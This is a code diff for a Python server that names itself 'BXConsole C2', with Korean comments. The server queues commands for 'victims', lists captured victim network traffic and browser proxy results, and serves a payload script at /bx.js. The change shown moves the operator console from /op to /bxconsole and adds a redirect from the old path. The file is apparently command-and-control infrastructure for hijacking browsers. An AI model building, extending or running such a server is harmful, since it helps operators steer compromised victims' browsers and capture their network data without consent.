@@ -11,7 +11,7 @@
   GET  /api/net?id=  피해자 네트워크 캡처 목록 (v0.2)
   GET  /api/proxy?rid= 브라우저 프록시 결과 조회 (v0.2)
   POST /api/send     명령 큐잉 {id, cmd}
-  GET  /op           운영자 웹 콘솔
+  GET  /bxconsole    운영자 웹 콘솔 (구 /op → 302 리다이렉트)
 명령 상태: QUEUED(대기) → SENT(피해자 전달) → DONE(실행·결과 수신)
 """
 import http.server, socketserver, json, time, os, sys, re, base64, shutil, urllib.parse, random, string, threading
@@ -432,8 +432,13 @@ class Handler(http.server.BaseHTTPRequestHandler):
                       # 휴지통 (soft delete — 복원 가능)
                       "trash": TRASH}
             self._send(200, "application/json", json.dumps(st, ensure_ascii=False).encode())
-        elif p == "/op":
+        elif p == "/bxconsole":
             self._send(200, "text/html", open(OPHTML).read().encode())
+        elif p == "/op":
+            # 구 주소 호환 — 새 엔드포인트로 리다이렉트
+            self.send_response(302)
+            self.send_header("Location", "/bxconsole")
+            self.end_headers()
         else:
             self._send(200, "text/plain", f"BXConsole C2 v0.1.1 — {p}".encode())
 
@@ -722,7 +727,7 @@ if __name__ == "__main__":
     load_sessions()
     threading.Thread(target=_stale_watcher, daemon=True).start()
     sess_count = len(VICTIMS) + len(CLOSED)
-    print(f"BXConsole C2 v0.2  :{PORT}  | payload /bx.js | console /op | sessions: {sess_count} loaded | evidence: {EVID}")
+    print(f"BXConsole C2 v0.2  :{PORT}  | payload /bx.js | console /bxconsole | sessions: {sess_count} loaded | evidence: {EVID}")
     try:
         S(("0.0.0.0", PORT), Handler).serve_forever()
     except OSError as e:
